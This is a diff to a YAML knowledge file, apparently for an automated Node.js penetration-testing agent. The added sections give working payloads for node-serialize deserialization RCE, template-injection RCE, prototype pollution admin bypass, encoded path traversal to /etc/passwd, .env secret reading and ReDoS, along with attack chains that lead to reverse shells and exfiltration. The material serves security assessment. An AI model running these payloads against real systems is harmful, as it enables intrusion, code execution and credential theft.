@@ -12,67 +12,147 @@ tools:
   - nuclei
   - httpx
 knowledge: |
-  Node.js applications have specific security considerations related to JavaScript runtime,
-  NPM packages, and common frameworks like Express.js.
-  
-  ## Common Node.js Vulnerabilities:
-  1. **Prototype Pollution**: Modify Object.prototype
-  2. **Package Vulnerabilities**: Outdated NPM dependencies
-  3. **Path Traversal**: Directory traversal in file operations
-  4. **Code Injection**: eval(), Function() constructor abuse
-  5. **Deserialization**: Unsafe JSON parsing
-  
-  ## Node.js Specific Files:
-  - `package.json` - Project metadata and dependencies
-  - `package-lock.json` - Exact dependency versions
-  - `node_modules/` - Installed packages directory
-  - `.env` - Environment variables
-  - `server.js` / `app.js` - Main application files
-  
-  ## Express.js Patterns:
-  - Route handlers and middleware
-  - Static file serving
-  - Template engines (EJS, Pug, Handlebars)
-  - Session management
-  - CORS configuration
-  
-  ## Security Headers:
-  - Helmet.js middleware for security headers
-  - CORS configuration
-  - Rate limiting middleware
+  Node.js attack surface spans the runtime, NPM ecosystem, and framework-specific patterns. JavaScript's dynamic nature enables prototype pollution, deserialization RCE, and template injection uniquely.
+
+  ## Prototype Pollution Deep Dive
+  - **__proto__ injection**: `{"__proto__":{"isAdmin":true}}` — pollutes Object.prototype, affects all objects app-wide.
+    When JSON body merges into objects via Object.assign, lodash.merge, jQuery.extend, deep-merge libraries.
+  - **constructor.prototype**: `{"constructor":{"prototype":{"isAdmin":true}}}` — alternative path when __proto__ filtered.
+  - **Nested merge functions**: lodash.merge, lodash.defaultsDeep, hoek.merge, deap.merge — known vulnerable versions.
+    Object.assign is shallow (safe for nested), but custom deep-merge functions are almost always vulnerable.
+  - **Detecting pollution**: After sending payload, check if new properties appear on unrelated objects.
+    `{"__proto__":{"polluted":"yes"}}` → subsequent request includes `{}.polluted` → confirms pollution.
+    Error message changes, new fields in responses, or behavioral shifts indicate successful pollution.
+  - **Gadget chains**: Pollution alone may be low impact. When combined with:
+    - EJS: pollute `outputFunctionName` → RCE via template rendering.
+    - Pug: pollute `block` or `self` → code execution during compilation.
+    - Express: pollute `trust proxy`, `env` → bypass security settings.
+    - JSON.stringify: pollute `toJSON` → alter serialization behavior app-wide.
+  - **Query string pollution**: `?__proto__[isAdmin]=true` via qs library (Express default query parser).
+
+  ## Deserialization RCE
+  - **node-serialize**: `unserialize()` executes JavaScript via `_$$ND_FUNC$$_` marker.
+    Payload: `{"cmd":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}` — instant RCE.
+  - **YAML.load (js-yaml < 4.0)**: `!!js/function "function(){return process.env}"` — arbitrary code execution.
+    `!!js/object` and `!!js/regexp` also exploitable in older js-yaml versions.
+  - **serialize-javascript**: When used to serialize user data that gets eval'd — code injection.
+  - **Detection**: Look for cookie values or API fields containing serialized objects (base64 decode, look for function markers).
+    Cookies with names like "session", "profile", "data" containing encoded objects → test deserialization.
+
+  ## Template Engine Injection
+  - **EJS**: `<%- userInput %>` (unescaped) → XSS. When user input reaches template compilation:
+    `<%= process.mainModule.require('child_process').execSync('id') %>` — RCE if input is in template string.
+    Prototype pollution → set `outputFunctionName` to injected code → RCE on next render.
+  - **Pug (Jade)**: `!{userInput}` (unescaped). Template injection: `#{7*7}` → 49.
+    When user input in Pug source: `-var x=process.mainModule.require('child_process').execSync('id')`.
+  - **Handlebars**: Generally safe (auto-escape), but custom helpers may be dangerous.
+    `{{#with (lookup this "constructor")}}{{#with (lookup this "constructor")}}{{this "return process.env"}}{{/with}}{{/with}}`
+    — known helper-based RCE in certain Handlebars versions + configurations.
+  - **Nunjucks**: `{{ range.constructor("return process.env")() }}` — constructor-based code execution.
+    `{{ ''.__class__.__mro__[1].__subclasses__() }}` — Python-style but adapted for Nunjucks sandbox escape.
+  - **Detection**: Send `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `#{7*7}` — observe which evaluates.
+
+  ## Path Traversal Variants
+  - **path.join() with user input**: `path.join('/uploads', userInput)` — userInput="../../../etc/passwd" traverses out.
+    path.join normalizes but doesn't prevent traversal. path.resolve similarly dangerous.
+  - **express.static misconfiguration**: `app.use('/static', express.static(userControlledPath))` — serve arbitrary directories.
+    Missing root restriction: `express.static('.')` serves entire project including .env, config files.
+  - **Encoding bypasses**: `..%2f`, `..%5c`, `%2e%2e/`, `%2e%2e%2f` — URL-encoded traversal.
+    Double encoding: `%252e%252e%252f` when app decodes twice. Try `..%00/` (null byte, older Node < 8).
+  - **Path normalization differences**: Windows: `..\\`, `..\/` mixed separators. path.join handles both on Windows.
+  - **sendFile/download**: `res.sendFile(userInput)` or `res.download(userInput)` without path validation → arbitrary file read.
+
+  ## Event Loop & Runtime Abuse
+  - **ReDoS (Regular Expression DoS)**: Patterns with nested quantifiers: `(a+)+$`, `(a|a)+$`, `([a-z]+)*$`.
+    Send input like "aaaaaaaaaaaaaaaaaaaaa!" — exponential backtracking blocks event loop.
+    Identify via: long response times on specific inputs, application hangs, CPU spike.
+  - **CPU-bound blocking**: Synchronous crypto, JSON.parse on huge payloads, complex computations — blocks all requests.
+    Send massive JSON body: `{"key":"A".repeat(10000000)}` — test if parsing blocks other requests.
+  - **Unhandled promise rejections**: May leak stack traces, file paths, database connection strings in error responses.
+    Send malformed input to async endpoints, observe error details.
+  - **Buffer allocation**: `Buffer.allocUnsafe(n)` returns uninitialized memory — historical info leak vector (Node < 10).
+
+  ## NPM Supply Chain Attacks
+  - **Typosquatting**: lodash vs 1odash, express vs expresss — malicious packages with similar names.
+  - **postinstall scripts**: package.json scripts.postinstall runs arbitrary code on `npm install`.
+    Check package.json for suspicious lifecycle scripts: preinstall, postinstall, preuninstall.
+  - **Lockfile manipulation**: Attacker modifies package-lock.json to point at malicious registry or tarball URL.
+    Inspect integrity hashes and resolved URLs in lock files for anomalies.
+  - **Dependency confusion**: Internal package name published to public NPM → public version installed instead.
+  - **CVE lookup**: Extract versions from /package.json → cross-reference with npm audit, Snyk, or CVE databases.
+    Key libraries to check: express, lodash, jsonwebtoken, mongoose, sequelize, axios, helmet.
+
+  ## Express.js Specific Attacks
+  - **Route parameter pollution**: `/api/users/:id` — send `/api/users/123?id=456`. req.params.id vs req.query.id confusion.
+  - **Middleware ordering bypass**: Auth middleware after route handler → handler executes without auth.
+    `app.get('/admin', handler); app.use(authMiddleware);` — order matters, handler runs unauthed.
+  - **Error handler info leak**: Default Express error handler exposes stack traces when NODE_ENV !== 'production'.
+    Custom error handlers may still leak: `res.status(500).json({error: err.message, stack: err.stack})`.
+  - **trust proxy misconfiguration**: `app.set('trust proxy', true)` → trusts X-Forwarded-For blindly.
+    Attacker spoofs IP → bypasses IP-based rate limiting, access controls, audit logging.
+  - **CORS misconfiguration**: `cors({origin: true})` or `cors({origin: req.headers.origin})` reflects any origin → credential theft.
+  - **Body parser limits**: No size limit on body-parser → DoS via huge request bodies. Default is 100kb but often overridden.
+  - **X-Powered-By**: Express sets `X-Powered-By: Express` by default — fingerprinting. Helmet removes it.
+  - **Route regex DoS**: Complex route patterns like `/^(a+)+$/` — same ReDoS risk in route matching.
+
+  ## Chaining Scenarios
+  - Prototype pollution → set EJS outputFunctionName → RCE on next template render → reverse shell.
+  - /package.json exposure → identify vulnerable lodash version → craft prototype pollution payload → admin bypass.
+  - node-serialize cookie → craft _$$ND_FUNC$$_ payload → RCE → establish persistence.
+  - Express middleware ordering → unauthenticated access to admin route → data exfiltration.
+  - ReDoS on login endpoint → application DoS → force restart → race condition on initialization.
+  - .env file exposure → database credentials → direct database access → full data compromise.
+  - Supply chain: typosquatted package → postinstall RCE → backdoor in CI/CD → compromised builds.
 examples:
   - title: "Package.json Exposure"
-    description: "Check for exposed package.json file"
-    payload: "/package.json"
-    validation: "Look for Node.js dependencies and version information"
-  - title: "Prototype Pollution Test"
-    description: "Test for prototype pollution vulnerability"
-    payload: '{"__proto__":{"polluted":"true"}}'
-    validation: "Check if prototype pollution affects application behavior"
-  - title: "Path Traversal"
-    description: "Test for directory traversal in Node.js file operations"
-    payload: "../../../etc/passwd"
+    description: "Check for exposed package.json and cross-reference dependencies with CVE databases"
+    payload: "/package.json, /package-lock.json"
+    validation: "Extract dependency versions, check for known vulnerable packages"
+  - title: "Prototype Pollution via JSON Body"
+    description: "Test prototype pollution through request body merge operations"
+    payload: '{"__proto__":{"isAdmin":true}} and {"constructor":{"prototype":{"isAdmin":true}}}'
+    validation: "Check if subsequent requests show polluted properties in responses or behavior changes"
+  - title: "Prototype Pollution via Query String"
+    description: "Test pollution through Express qs query parser"
+    payload: "?__proto__[isAdmin]=true&__proto__[role]=admin"
+    validation: "Check if application behavior changes (new fields in responses, bypassed checks)"
+  - title: "node-serialize RCE"
+    description: "Test for deserialization RCE via node-serialize unserialize()"
+    payload: '{"cmd":"_$$ND_FUNC$$_function(){require(\"child_process\").exec(\"id\")}()"}'
+    validation: "Check for command execution evidence (DNS callback, response timing)"
+  - title: "Template Injection Detection"
+    description: "Test multiple template engines for SSTI"
+    payload: "{{7*7}}, ${7*7}, <%= 7*7 %>, #{7*7}"
+    validation: "Look for '49' in response — identifies active template engine"
+  - title: "Path Traversal with Encoding"
+    description: "Test path traversal with various encoding bypasses"
+    payload: "../../../etc/passwd, ..%2f..%2f..%2fetc/passwd, ..%252f..%252f..%252fetc/passwd"
     validation: "Look for system file contents in response"
-  - title: "Server-Side JavaScript Injection"
-    description: "Test for code injection in Node.js"
-    payload: "'; process.exit(1); //"
-    validation: "Check if application crashes or behaves unexpectedly"
+  - title: "Express Middleware Order Bypass"
+    description: "Test if auth middleware runs after route handlers"
+    payload: "Access /admin endpoints without authentication token"
+    validation: "Check if route handler executes before authentication middleware"
   - title: "Environment File Access"
-    description: "Try to access environment configuration files"
-    payload: "/.env"
-    validation: "Look for environment variables and secrets"
-  - title: "Node Modules Enumeration"
-    description: "Enumerate installed NPM packages"
-    payload: "/node_modules/express/package.json"
-    validation: "Check for package information and versions"
+    description: "Access .env and configuration files for secrets"
+    payload: "/.env, /config/default.json, /config/production.json"
+    validation: "Look for database credentials, API keys, SECRET values"
+  - title: "ReDoS Event Loop Blocking"
+    description: "Test for Regular Expression Denial of Service"
+    payload: "Send input with repeated characters + terminator to regex-validated fields (e.g., 'aaaa...aaa!')"
+    validation: "Observe response time increase — >5s suggests ReDoS vulnerability"
 validation_methods:
-  - "Check for Node.js specific error messages and stack traces"
-  - "Look for Express.js powered by headers"
-  - "Test for common Node.js file paths and endpoints"
-  - "Analyze package.json for vulnerable dependencies"
-  - "Test prototype pollution with various payloads"
-  - "Check for exposed environment variables"
+  - "Check for Node.js/Express fingerprints: X-Powered-By header, error page format, stack traces"
+  - "Test prototype pollution with __proto__ and constructor.prototype in JSON body and query string"
+  - "Analyze package.json dependencies against known CVE databases"
+  - "Test path traversal with plain, URL-encoded, and double-encoded payloads"
+  - "Test all template engine syntaxes for SSTI (EJS, Pug, Handlebars, Nunjucks)"
+  - "Check for deserialization sinks in cookies and API parameters"
+  - "Verify Express middleware ordering and auth enforcement on all routes"
+  - "Test ReDoS patterns on input validation fields with crafted payloads"
+  - "Check for exposed .env, config files, and node_modules paths"
 references:
   - "https://nodejs.org/en/docs/guides/security/"
   - "https://expressjs.com/en/advanced/best-practice-security.html"
   - "https://github.com/goldbergyoni/nodebestpractices#6-security-best-practices"
+  - "https://portswigger.net/research/server-side-prototype-pollution"
+  - "https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution"
